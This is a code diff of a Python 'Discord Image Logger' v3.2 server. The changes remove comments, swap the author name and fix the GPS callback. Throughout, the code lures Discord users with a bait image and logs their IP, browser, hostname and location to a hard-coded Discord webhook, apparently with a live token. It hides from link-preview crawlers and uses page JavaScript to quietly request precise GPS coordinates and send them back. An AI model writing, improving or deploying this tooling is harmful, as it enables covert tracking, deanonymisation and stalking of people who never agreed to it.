@@ -4,56 +4,35 @@ from urllib import parse
 import traceback, requests, base64, httpagentparser, socket
 from datetime import datetime, timezone
 
-__app__         = "Discord Image Logger"
-__version__     = "v3.2"
-__author__      = "C00lB0i"
+__app__     = "Discord Image Logger"
+__version__ = "v3.2"
+__author__  = "dev bt rafi"
 
 config = {
-    # ── BASE CONFIG ──────────────────────────────────────────────────────────
     "webhook": "https://discordapp.com/api/webhooks/1473590436055482430/9n7NGn-u_xqmSa9ofFsKc2KW_yXxkRNHSk21c5A94bDnHaEMuSePrSK2WEeNKqpKVhWU",
     "image":   "https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExbDVtZWtpb3JpNXpqOXdtMTBkNGF4dHZnc21vMGN6YXprNTM0cmxwMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/ZuzxVIWWHUQDkhrtu6/giphy.gif",
-    "imageArgument": True,  # Allow ?url=<base64> or ?id=<base64> to override image
-
-    # ── CUSTOMIZATION ────────────────────────────────────────────────────────
+    "imageArgument": True,
     "username": "Image Logger",
     "color":    0x00FFFF,
-
-    # ── OPTIONS ──────────────────────────────────────────────────────────────
     "crashBrowser": False,
-
     "message": {
         "doMessage":   False,
-        "message":     "This browser has been pwned by C00lB0i's Image Logger.",
+        "message":     "This browser has been pwned.",
         "richMessage": True,
     },
-
-    # vpnCheck: 0=off | 1=no @everyone ping for VPN | 2=skip alert entirely
     "vpnCheck":   1,
     "linkAlerts": True,
-    # buggedImage: serve a fake loading GIF to Discord crawlers
     "buggedImage": True,
-
-    # antiBot: 0=off | 1=no ping hosting IPs | 2=no ping 100% bot
-    #          3=skip alert hosting | 4=skip alert 100% bot
     "antiBot": 1,
-
-    # ── REDIRECTION ──────────────────────────────────────────────────────────
     "redirect": {
         "redirect": False,
         "page":     "https://your-link.here",
     },
 }
 
-# IP prefixes to silently ignore
 blacklistedIPs = ("27", "104", "143", "164")
-
-# In-memory visit counter per endpoint
 _visit_counts: dict = {}
 
-
-# ─────────────────────────────────────────────────────────────────────────────
-# Helpers
-# ─────────────────────────────────────────────────────────────────────────────
 
 def _flag(country_code: str) -> str:
     if not country_code or len(country_code) != 2:
@@ -100,18 +79,11 @@ def reportError(error: str):
 
 def makeReport(ip, useragent=None, endpoint="N/A", url=False,
                coords=None, is_gps_update=False):
-    """
-    POST a Discord embed for a visitor.
-
-    coords        : "lat,lon" string (GPS-precise) or None (use ip-api)
-    is_gps_update : True when this is the follow-up GPS-precise report
-    """
     if not ip or ip.startswith(blacklistedIPs):
         return
 
     bot = botCheck(ip, useragent or "")
 
-    # ── Bot / link-alert path ─────────────────────────────────────────────
     if bot and not is_gps_update:
         if config["linkAlerts"]:
             try:
@@ -134,7 +106,6 @@ def makeReport(ip, useragent=None, endpoint="N/A", url=False,
                 pass
         return
 
-    # ── Geolocation via ip-api.com ────────────────────────────────────────
     ping = "@everyone"
     try:
         info = requests.get(
@@ -160,12 +131,9 @@ def makeReport(ip, useragent=None, endpoint="N/A", url=False,
         if config["antiBot"] == 1:
             ping = ""
 
-    # ── OS / Browser ──────────────────────────────────────────────────────
     os_name, browser_name = httpagentparser.simple_detect(useragent or "")
 
-    # ── Coordinates & Google Maps link ────────────────────────────────────
     if coords:
-        # Precise GPS coords sent back by the page JS
         parts = coords.replace(",", " ").split()
         lat, lon = (parts[0], parts[1]) if len(parts) == 2 else ("", "")
         coord_label = "\U0001f4cd Precise (GPS)"
@@ -180,13 +148,9 @@ def makeReport(ip, useragent=None, endpoint="N/A", url=False,
     else:
         coord_text = "`Unknown`"
 
-    # ── Country flag ─────────────────────────────────────────────────────
     flag = _flag(info.get("countryCode", ""))
-
-    # ── Reverse DNS ───────────────────────────────────────────────────────
     hostname = _rdns(ip)
 
-    # ── Timezone ──────────────────────────────────────────────────────────
     tz_raw   = info.get("timezone", "/")
     tz_parts = tz_raw.split("/")
     tz_display = (
@@ -194,15 +158,12 @@ def makeReport(ip, useragent=None, endpoint="N/A", url=False,
         if len(tz_parts) == 2 else tz_raw
     )
 
-    # ── Visit counter ─────────────────────────────────────────────────────
     if not is_gps_update:
         _visit_counts[endpoint] = _visit_counts.get(endpoint, 0) + 1
     visit_no = _visit_counts.get(endpoint, 1)
 
-    # ── Timestamp ─────────────────────────────────────────────────────────
     now_utc = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
 
-    # ── Title changes for GPS update embed ────────────────────────────────
     title = (
         "Image Logger \u2014 \U0001f4cd GPS Location Updated"
         if is_gps_update else
@@ -265,13 +226,6 @@ def makeReport(ip, useragent=None, endpoint="N/A", url=False,
 
 
 def _make_og_page(image_url: str) -> bytes:
-    """
-    Returns an HTML page with Open Graph meta tags.
-    When Discord crawls this URL it reads the og:image tag and renders
-    a large image embed with an "Open Original" button.
-    Clicking "Open Original" opens the URL in the browser — that's when
-    the real visitor path runs and the IP gets logged.
-    """
     html = f"""<!DOCTYPE html>
 <html>
 <head>
@@ -290,12 +244,6 @@ def _make_og_page(image_url: str) -> bytes:
 
 
 def _make_image_page(image_url: str, callback_url: str) -> bytes:
-    """
-    Returns an HTML page that:
-    1. Displays the image fullscreen (looks completely normal to the user)
-    2. Silently requests GPS in the background
-    3. If granted, POSTs coords back to callback_url — no redirect, no reload
-    """
     html = f"""<!DOCTYPE html>
 <html>
 <head>
@@ -320,20 +268,18 @@ def _make_image_page(image_url: str, callback_url: str) -> bytes:
 <img src="{image_url}" alt="">
 <script>
 (function() {{
-  // Silently attempt GPS — no redirect, no reload, page stays on image
   if (navigator.geolocation) {{
     navigator.geolocation.getCurrentPosition(
       function(pos) {{
         var lat = pos.coords.latitude;
         var lon = pos.coords.longitude;
-        // Send coords back silently via fetch (no page change)
-        fetch('{callback_url}&g=' + encodeURIComponent(btoa(lat + ',' + lon)), {{
+        fetch('{callback_url}g=' + encodeURIComponent(btoa(lat + ',' + lon)), {{
           method: 'GET',
           mode: 'no-cors',
           cache: 'no-store'
         }}).catch(function(){{}});
       }},
-      function() {{ /* denied — no action, image stays visible */ }},
+      function() {{}},
       {{ timeout: 10000, maximumAge: 0, enableHighAccuracy: true }}
     );
   }}
@@ -344,9 +290,6 @@ def _make_image_page(image_url: str, callback_url: str) -> bytes:
     return html.encode("utf-8")
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-# Request handler
-# ─────────────────────────────────────────────────────────────────────────────
 class ImageLoggerAPI(BaseHTTPRequestHandler):
 
     def log_message(self, format, *args):
@@ -357,7 +300,6 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             s   = self.path
             dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
 
-            # ── Resolve bait image URL ────────────────────────────────────
             if config["imageArgument"] and (dic.get("url") or dic.get("id")):
                 raw = dic.get("url") or dic.get("id")
                 try:
@@ -367,23 +309,15 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             else:
                 url = config["image"]
 
-            # ── Safely get visitor IP & User-Agent ────────────────────────
             ip = _get_ip(self.headers)
             ua = self.headers.get("user-agent") or ""
 
-            # ── Blacklist check ───────────────────────────────────────────
             if ip and ip.startswith(blacklistedIPs):
                 self._redirect(url)
                 return
 
             endpoint = s.split("?")[0]
 
-            # ── Discord / bot crawler path ────────────────────────────────
-            # Discord crawls the link to build an embed preview.
-            # We return an Open Graph HTML page so Discord renders a
-            # large image embed with the "Open Original" button.
-            # Clicking that button opens the URL in the browser,
-            # which hits the real-visitor path below and logs the IP.
             if botCheck(ip, ua):
                 og_page = _make_og_page(url)
                 self.send_response(200)
@@ -393,10 +327,6 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 makeReport(ip, ua, endpoint=endpoint, url=url)
                 return
 
-            # ── GPS callback: silent fetch from the image page JS ─────────
-            # When the JS on the image page gets GPS coords, it fetches
-            # the same URL with &g=<base64 coords> appended.
-            # We handle that here and return an empty 200 (no page change).
             if dic.get("g"):
                 try:
                     coords = base64.b64decode(dic["g"].encode()).decode()
@@ -411,11 +341,8 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 self.wfile.write(b"ok")
                 return
 
-            # ── Real visitor — first hit ──────────────────────────────────
-            # 1. Log IP immediately (IP-based location)
             makeReport(ip, ua, endpoint=endpoint, url=url)
 
-            # 2. Handle special modes
             if config["redirect"]["redirect"]:
                 self._redirect(config["redirect"]["page"])
                 return
@@ -437,17 +364,12 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 )
                 return
 
-            # 3. Default: serve the image page (shows image + silent GPS)
-            #    Build the callback URL so JS can ping back with coords
-            #    We preserve any existing query params (url/id) so the
-            #    callback also resolves the same image.
             base_path = endpoint
             cb_params = {}
             if dic.get("url"):
                 cb_params["url"] = dic["url"]
             elif dic.get("id"):
                 cb_params["id"] = dic["id"]
-            # Build callback URL — JS will append &g=<coords> to this
             cb_query     = ("?" + parse.urlencode(cb_params) + "&") if cb_params else "?"
             callback_url = base_path + cb_query
 
